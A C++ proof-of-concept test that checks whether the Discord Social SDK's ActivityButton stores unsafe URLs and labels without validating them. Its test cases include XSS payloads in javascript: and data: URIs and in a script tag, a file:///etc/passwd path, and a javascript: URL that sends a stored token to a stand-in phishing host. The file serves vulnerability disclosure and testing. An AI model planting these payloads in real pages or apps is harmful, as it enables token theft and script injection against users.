// Proof of Concept: Missing URL Validation in Discord Social SDK v1.8.14587
// ActivityButton::SetUrl() accepts dangerous URL schemes without validation
//
// Build:
//   g++ -std=c++17 -DDISCORDPP_IMPLEMENTATION \
//       -I../../sdk/include poc_url_validation.cc \
//       -L../../build -ldiscord_partner_sdk \
//       -Wl,-rpath,../../build -o poc_url
//
// Run:
//   LD_LIBRARY_PATH=../../build ./poc_url

#define DISCORDPP_IMPLEMENTATION
#include "../../sdk/include/discordpp.h"

#include <cassert>
#include <cstdio>
#include <string>
#include <vector>

struct TestCase {
    std::string scheme;
    std::string url;
    std::string risk;
};

int main() {
    printf("===================================================\n");
    printf("Discord Social SDK v%d.%d.%d - URL Validation PoC\n",
           discordpp::Client::GetVersionMajor(),
           discordpp::Client::GetVersionMinor(),
           discordpp::Client::GetVersionPatch());
    printf("===================================================\n\n");

    std::vector<TestCase> tests = {
        {"https",       "https://discord.com/games/123",               "SAFE (expected)"},
        {"http",        "http://evil.com/phish",                       "MITM / Downgrade"},
        {"javascript",  "javascript:alert(document.cookie)",            "XSS"},
        {"javascript",  "javascript:document.location='https://phish.example.com/?token='+localStorage.getItem('token')",
                                                                        "Token theft"},
        {"data",        "data:text/html,<script>alert(document.domain)</script>",
                                                                        "XSS via data URI"},
        {"data-b64",    "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
                                                                        "XSS via base64 data URI"},
        {"file",        "file:///etc/passwd",                          "Local file access"},
        {"ftp",         "ftp://evil.com/malware.exe",                  "Protocol abuse"},
        {"discord",     "discord:///activity/join/SECRET_JOIN_TOKEN",  "Deep link injection"},
        {"proto-rel",   "//evil-phishing.com/fake-login",              "Protocol-relative phishing"},
        {"empty",       "",                                             "Empty URL (undefined behavior)"},
    };

    int found = 0;
    int total = 0;

    for (auto& t : tests) {
        total++;
        discordpp::Activity act;
        act.SetName("Test Game");

        discordpp::ActivityButton btn;
        btn.SetLabel("Click Me");
        btn.SetUrl(t.url);
        act.AddButton(std::move(btn));

        auto buttons = act.GetButtons();
        assert(!buttons.empty());

        std::string stored = buttons[0].Url();
        bool verbatim = (stored == t.url);

        if (verbatim && t.scheme != "https" && t.scheme != "empty") {
            found++;
            printf("[VULN] scheme=%-12s risk=%-30s stored_verbatim=YES\n",
                   t.scheme.c_str(), t.risk.c_str());
            printf("       URL: %.80s%s\n", t.url.c_str(),
                   t.url.size() > 80 ? "..." : "");
        } else if (t.scheme == "https") {
            printf("[OK]   scheme=%-12s risk=%-30s stored_verbatim=%s\n",
                   t.scheme.c_str(), t.risk.c_str(), verbatim ? "YES" : "NO");
        } else {
            printf("[SAFE] scheme=%-12s risk=%-30s stored_verbatim=NO (sanitized)\n",
                   t.scheme.c_str(), t.risk.c_str());
        }
    }

    // Also verify labels accept XSS payloads
    printf("\n--- Label Injection ---\n");
    discordpp::ActivityButton btn;
    btn.SetLabel("<script>alert('XSS')</script>");
    bool label_vuln = (btn.Label() == "<script>alert('XSS')</script>");
    printf("[%s] XSS in button label: %s\n",
           label_vuln ? "VULN" : "SAFE",
           label_vuln ? "stored verbatim" : "sanitized");
    if (label_vuln) found++;

    printf("\n===================================================\n");
    printf("Result: %d/%d issues confirmed - NO input validation\n", found, total);
    printf("===================================================\n");

    return found > 0 ? 1 : 0;
}
